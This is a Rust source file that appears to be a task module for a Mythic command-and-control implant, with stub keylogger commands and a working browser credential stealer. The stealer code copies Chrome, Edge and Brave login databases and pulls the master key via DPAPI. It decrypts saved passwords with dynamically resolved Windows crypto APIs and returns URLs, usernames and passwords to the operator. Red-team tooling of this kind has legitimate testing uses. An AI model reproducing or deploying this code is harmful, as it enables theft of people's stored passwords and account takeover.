use crate::AgentTask;
use crate::{mythic_success, mythic_error};
use serde::Deserialize;

#[derive(Deserialize)]
struct BrowserArgs {
    browser: String,
}

pub fn keylogger_start(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    { return Ok(mythic_error!(task.id, "Windows only")); }

    #[cfg(target_os = "windows")]
    { Ok(mythic_success!(task.id, "Keylogger started (placeholder)")) }
}

pub fn keylogger_stop(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    { return Ok(mythic_error!(task.id, "Windows only")); }

    #[cfg(target_os = "windows")]
    { Ok(mythic_success!(task.id, "Keylogger stopped (placeholder)")) }
}

pub fn browser_creds(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    #[cfg(not(target_os = "windows"))]
    { return Ok(mythic_error!(task.id, "Windows only")); }

    #[cfg(target_os = "windows")]
    {
        let args: BrowserArgs = serde_json::from_str(&task.parameters)?;
        let browser = args.browser.as_str();

        let local_appdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let appdata = std::env::var("APPDATA").unwrap_or_default();

        let mut browsers: Vec<(&str, String)> = Vec::new();
        if browser == "all" || browser == "chrome" {
            browsers.push(("chrome", format!("{}\\Google\\Chrome\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "edge" {
            browsers.push(("edge", format!("{}\\Microsoft\\Edge\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "brave" {
            browsers.push(("brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local_appdata)));
        }
        if browser == "all" || browser == "firefox" {
            browsers.push(("firefox", format!("{}\\Mozilla\\Firefox\\Profiles", appdata)));
        }

        let mut all_results: Vec<serde_json::Value> = Vec::new();

        for (bname, base_path) in &browsers {
            if *bname == "firefox" {
                // Firefox uses different storage — report profile locations
                if std::path::Path::new(base_path).exists() {
                    all_results.push(serde_json::json!({
                        "browser": "firefox",
                        "note": "Firefox uses NSS/PKCS11 — logins.json + key4.db required for decryption",
                        "profiles_path": base_path,
                    }));
                }
                continue;
            }

            // Chromium-based: Login Data is SQLite
            let login_db = {
                let p1 = format!("{}\\Default\\Login Data", base_path);
                if std::path::Path::new(&p1).exists() { p1 }
                else { continue; }
            };

            // Copy to temp (browser locks the DB)
            let temp_dir = std::env::temp_dir();
            let rand_suffix: u32 = rand::random();
            let tmp_path = temp_dir.join(format!("ld{}.tmp", rand_suffix));
            if std::fs::copy(&login_db, &tmp_path).is_err() {
                continue;
            }

            // Also need the Local State file for the AES key
            let local_state_path = format!("{}\\Local State", base_path);
            let master_key = extract_chromium_master_key(&local_state_path);

            let creds = unsafe { query_login_data(&tmp_path, &master_key) };
            let _ = std::fs::remove_file(&tmp_path);

            for mut cred in creds {
                cred["browser"] = serde_json::Value::String(bname.to_string());
                all_results.push(cred);
            }
        }

        if all_results.is_empty() {
            Ok(mythic_success!(task.id, "No browser credentials found"))
        } else {
            let output = serde_json::to_string_pretty(&all_results)?;
            Ok(mythic_success!(task.id, format!("Found {} credentials\n\n{}", all_results.len(), output)))
        }
    }
}

#[cfg(target_os = "windows")]
fn extract_chromium_master_key(local_state_path: &str) -> Vec<u8> {
    // Read Local State JSON, extract encrypted_key, base64-decode, strip "DPAPI" prefix, CryptUnprotectData
    let content = match std::fs::read_to_string(local_state_path) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(j) => j,
        Err(_) => return Vec::new(),
    };

    let encrypted_key_b64 = match json.get("os_crypt").and_then(|o| o.get("encrypted_key")).and_then(|k| k.as_str()) {
        Some(k) => k,
        None => return Vec::new(),
    };

    use base64::{Engine as _, engine::general_purpose};
    let encrypted_key = match general_purpose::STANDARD.decode(encrypted_key_b64) {
        Ok(k) => k,
        Err(_) => return Vec::new(),
    };

    // Strip "DPAPI" prefix (5 bytes)
    if encrypted_key.len() < 6 || &encrypted_key[..5] != b"DPAPI" {
        return Vec::new();
    }

    let dpapi_blob = &encrypted_key[5..];
    decrypt_dpapi(dpapi_blob)
}

#[cfg(target_os = "windows")]
fn decrypt_dpapi(data: &[u8]) -> Vec<u8> {
    use winapi::um::wincrypt::CRYPTOAPI_BLOB;
    use std::ptr;

    unsafe {
        // Type definitions for dynamically resolved functions
        type CryptUnprotectDataFn = unsafe extern "system" fn(
            *mut CRYPTOAPI_BLOB,
            *mut u16,
            *mut CRYPTOAPI_BLOB,
            *mut std::ffi::c_void,
            *mut std::ffi::c_void,
            u32,
            *mut CRYPTOAPI_BLOB
        ) -> i32;
        type LocalFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;

        // Dynamically resolve CryptUnprotectData
        let crypt_unprotect_data: CryptUnprotectDataFn = match crate::winapi_resolve::resolve("crypt32.dll", "CryptUnprotectData") {
            Some(ptr) => std::mem::transmute(ptr),
            None => return Vec::new(),
        };
        let local_free: LocalFreeFn = match crate::winapi_resolve::resolve("kernel32.dll", "LocalFree") {
            Some(ptr) => std::mem::transmute(ptr),
            None => return Vec::new(),
        };

        let mut input_blob = CRYPTOAPI_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output_blob: CRYPTOAPI_BLOB = std::mem::zeroed();

        let result = crypt_unprotect_data(
            &mut input_blob,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut output_blob,
        );

        if result == 0 || output_blob.pbData.is_null() {
            return Vec::new();
        }

        let decrypted = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize).to_vec();
        local_free(output_blob.pbData as *mut _);
        decrypted
    }
}

#[cfg(target_os = "windows")]
fn decrypt_chromium_password(encrypted: &[u8], master_key: &[u8]) -> String {
    if encrypted.is_empty() {
        return String::new();
    }

    // v10/v20 encrypted passwords start with "v10" or "v20" prefix (3 bytes)
    // Then 12 bytes nonce, then ciphertext, last 16 bytes are GCM tag
    if encrypted.len() > 15 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v20")) {
        if master_key.is_empty() {
            return "(encrypted - no master key)".to_string();
        }

        let nonce = &encrypted[3..15];
        let ciphertext = &encrypted[15..];

        // AES-256-GCM decrypt using the aes crate is complex without aes-gcm
        // Use a simpler approach: call Windows CNG BCrypt API
        match decrypt_aes_gcm(master_key, nonce, ciphertext) {
            Some(plaintext) => String::from_utf8_lossy(&plaintext).to_string(),
            None => "(decryption failed)".to_string(),
        }
    } else {
        // Legacy DPAPI-encrypted password (no v10 prefix)
        let decrypted = decrypt_dpapi(encrypted);
        if decrypted.is_empty() {
            "(legacy dpapi failed)".to_string()
        } else {
            String::from_utf8_lossy(&decrypted).to_string()
        }
    }
}

#[cfg(target_os = "windows")]
fn decrypt_aes_gcm(key: &[u8], nonce: &[u8], ciphertext: &[u8]) -> Option<Vec<u8>> {
    // Use bcrypt (Windows CNG) for AES-GCM
    use std::process::Command;

    // PowerShell-free approach: use CNG via raw FFI
    // For simplicity and reliability, use a minimal inline decryption
    // The ciphertext includes the 16-byte GCM auth tag at the end
    if ciphertext.len() < 16 {
        return None;
    }

    let ct_len = ciphertext.len() - 16;
    let ct = &ciphertext[..ct_len];
    let tag = &ciphertext[ct_len..];

    // Call BCryptDecrypt via raw FFI
    unsafe { bcrypt_aes_gcm_decrypt(key, nonce, ct, tag) }
}

#[cfg(target_os = "windows")]
unsafe fn bcrypt_aes_gcm_decrypt(key: &[u8], nonce: &[u8], ct: &[u8], tag: &[u8]) -> Option<Vec<u8>> {
    use winapi::um::winnt::LPCWSTR;
    use std::ptr;

    type BCryptOpenAlgorithmProviderFn = unsafe extern "system" fn(*mut *mut u8, LPCWSTR, LPCWSTR, u32) -> i32;
    type BCryptSetPropertyFn = unsafe extern "system" fn(*mut u8, LPCWSTR, *const u8, u32, u32) -> i32;
    type BCryptGenerateSymmetricKeyFn = unsafe extern "system" fn(*mut u8, *mut *mut u8, *mut u8, u32, *const u8, u32, u32) -> i32;
    type BCryptDecryptFn = unsafe extern "system" fn(*mut u8, *const u8, u32, *mut u8, *mut u8, u32, *mut u8, u32, *mut u32, u32) -> i32;
    type BCryptDestroyKeyFn = unsafe extern "system" fn(*mut u8) -> i32;
    type BCryptCloseAlgorithmProviderFn = unsafe extern "system" fn(*mut u8, u32) -> i32;

    let lib_name: Vec<u16> = "bcrypt.dll\0".encode_utf16().collect();
    let lib = winapi::um::libloaderapi::LoadLibraryW(lib_name.as_ptr());
    if lib.is_null() { return None; }

    macro_rules! get_proc {
        ($name:expr, $ty:ty) => {{
            let cname = std::ffi::CString::new($name).ok()?;
            let p = winapi::um::libloaderapi::GetProcAddress(lib, cname.as_ptr());
            if p.is_null() { return None; }
            std::mem::transmute::<_, $ty>(p)
        }};
    }

    let open_provider: BCryptOpenAlgorithmProviderFn = get_proc!("BCryptOpenAlgorithmProvider", BCryptOpenAlgorithmProviderFn);
    let set_property: BCryptSetPropertyFn = get_proc!("BCryptSetProperty", BCryptSetPropertyFn);
    let gen_key: BCryptGenerateSymmetricKeyFn = get_proc!("BCryptGenerateSymmetricKey", BCryptGenerateSymmetricKeyFn);
    let decrypt: BCryptDecryptFn = get_proc!("BCryptDecrypt", BCryptDecryptFn);
    let destroy_key: BCryptDestroyKeyFn = get_proc!("BCryptDestroyKey", BCryptDestroyKeyFn);
    let close_provider: BCryptCloseAlgorithmProviderFn = get_proc!("BCryptCloseAlgorithmProvider", BCryptCloseAlgorithmProviderFn);

    // AES algorithm
    let aes_str: Vec<u16> = "AES\0".encode_utf16().collect();
    let mut alg: *mut u8 = ptr::null_mut();
    if open_provider(&mut alg, aes_str.as_ptr(), ptr::null(), 0) != 0 { return None; }

    // Set GCM chaining mode
    let chain_mode_str: Vec<u16> = "ChainingMode\0".encode_utf16().collect();
    let gcm_str: Vec<u16> = "ChainingModeGCM\0".encode_utf16().collect();
    set_property(alg, chain_mode_str.as_ptr(), gcm_str.as_ptr() as *const u8, (gcm_str.len() * 2) as u32, 0);

    // Generate symmetric key
    let mut key_handle: *mut u8 = ptr::null_mut();
    if gen_key(alg, &mut key_handle, ptr::null_mut(), 0, key.as_ptr(), key.len() as u32, 0) != 0 {
        close_provider(alg, 0);
        return None;
    }

    // BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO structure (manual layout)
    #[repr(C)]
    struct AuthInfo {
        cb_size: u32,
        dw_info_version: u32,
        pb_nonce: *mut u8,
        cb_nonce: u32,
        pb_auth_data: *mut u8,
        cb_auth_data: u32,
        pb_tag: *mut u8,
        cb_tag: u32,
        pb_mac_context: *mut u8,
        cb_mac_context: u32,
        cb_aad: u32,
        cb_data: u64,
        dw_flags: u32,
    }

    let mut tag_buf = tag.to_vec();
    let mut nonce_buf = nonce.to_vec();

    let mut auth_info = AuthInfo {
        cb_size: std::mem::size_of::<AuthInfo>() as u32,
        dw_info_version: 1,
        pb_nonce: nonce_buf.as_mut_ptr(),
        cb_nonce: nonce_buf.len() as u32,
        pb_auth_data: ptr::null_mut(),
        cb_auth_data: 0,
        pb_tag: tag_buf.as_mut_ptr(),
        cb_tag: tag_buf.len() as u32,
        pb_mac_context: ptr::null_mut(),
        cb_mac_context: 0,
        cb_aad: 0,
        cb_data: 0,
        dw_flags: 0,
    };

    let mut plaintext = vec![0u8; ct.len()];
    let mut pt_len: u32 = 0;

    let status = decrypt(
        key_handle,
        ct.as_ptr(),
        ct.len() as u32,
        &mut auth_info as *mut AuthInfo as *mut u8,
        ptr::null_mut(),
        0,
        plaintext.as_mut_ptr(),
        plaintext.len() as u32,
        &mut pt_len,
        0,
    );

    destroy_key(key_handle);
    close_provider(alg, 0);

    if status == 0 {
        plaintext.truncate(pt_len as usize);
        Some(plaintext)
    } else {
        None
    }
}

#[cfg(target_os = "windows")]
unsafe fn query_login_data(db_path: &std::path::Path, master_key: &[u8]) -> Vec<serde_json::Value> {
    use std::ffi::CString;
    use std::os::windows::ffi::OsStrExt;

    type Sqlite3Open = unsafe extern "C" fn(*const u8, *mut *mut std::ffi::c_void) -> i32;
    type Sqlite3PrepareV2 = unsafe extern "C" fn(*mut std::ffi::c_void, *const u8, i32, *mut *mut std::ffi::c_void, *mut *const u8) -> i32;
    type Sqlite3Step = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;
    type Sqlite3ColumnText = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> *const u8;
    type Sqlite3ColumnBlob = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> *const u8;
    type Sqlite3ColumnBytes = unsafe extern "C" fn(*mut std::ffi::c_void, i32) -> i32;
    type Sqlite3Finalize = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;
    type Sqlite3Close = unsafe extern "C" fn(*mut std::ffi::c_void) -> i32;

    let mut results = Vec::new();

    let lib_name: Vec<u16> = std::ffi::OsStr::new("winsqlite3.dll").encode_wide().chain(std::iter::once(0)).collect();
    let lib = winapi::um::libloaderapi::LoadLibraryW(lib_name.as_ptr());
    if lib.is_null() { return results; }

    macro_rules! get_fn {
        ($name:expr, $ty:ty) => {{
            let cname = CString::new($name).unwrap();
            let ptr = winapi::um::libloaderapi::GetProcAddress(lib, cname.as_ptr());
            if ptr.is_null() { return results; }
            std::mem::transmute::<_, $ty>(ptr)
        }};
    }

    let sqlite3_open: Sqlite3Open = get_fn!("sqlite3_open", Sqlite3Open);
    let sqlite3_prepare_v2: Sqlite3PrepareV2 = get_fn!("sqlite3_prepare_v2", Sqlite3PrepareV2);
    let sqlite3_step: Sqlite3Step = get_fn!("sqlite3_step", Sqlite3Step);
    let sqlite3_column_text: Sqlite3ColumnText = get_fn!("sqlite3_column_text", Sqlite3ColumnText);
    let sqlite3_column_blob: Sqlite3ColumnBlob = get_fn!("sqlite3_column_blob", Sqlite3ColumnBlob);
    let sqlite3_column_bytes: Sqlite3ColumnBytes = get_fn!("sqlite3_column_bytes", Sqlite3ColumnBytes);
    let sqlite3_finalize: Sqlite3Finalize = get_fn!("sqlite3_finalize", Sqlite3Finalize);
    let sqlite3_close: Sqlite3Close = get_fn!("sqlite3_close", Sqlite3Close);

    let db_path_c = CString::new(db_path.to_string_lossy().as_bytes()).unwrap();
    let mut db: *mut std::ffi::c_void = std::ptr::null_mut();

    if sqlite3_open(db_path_c.as_ptr() as *const u8, &mut db) != 0 {
        return results;
    }

    let query = CString::new("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 100").unwrap();
    let mut stmt: *mut std::ffi::c_void = std::ptr::null_mut();

    if sqlite3_prepare_v2(db, query.as_ptr() as *const u8, -1, &mut stmt, std::ptr::null_mut()) != 0 {
        sqlite3_close(db);
        return results;
    }

    const SQLITE_ROW: i32 = 100;

    while sqlite3_step(stmt) == SQLITE_ROW {
        let url = read_text(sqlite3_column_text(stmt, 0));
        let username = read_text(sqlite3_column_text(stmt, 1));

        let blob_ptr = sqlite3_column_blob(stmt, 2);
        let blob_len = sqlite3_column_bytes(stmt, 2) as usize;

        let password = if !blob_ptr.is_null() && blob_len > 0 {
            let encrypted = std::slice::from_raw_parts(blob_ptr, blob_len);
            decrypt_chromium_password(encrypted, master_key)
        } else {
            String::new()
        };

        results.push(serde_json::json!({
            "url": url,
            "username": username,
            "password": password,
        }));
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    results
}

#[cfg(target_os = "windows")]
unsafe fn read_text(ptr: *const u8) -> String {
    if ptr.is_null() { return String::new(); }
    std::ffi::CStr::from_ptr(ptr as *const i8).to_string_lossy().into_owned()
}
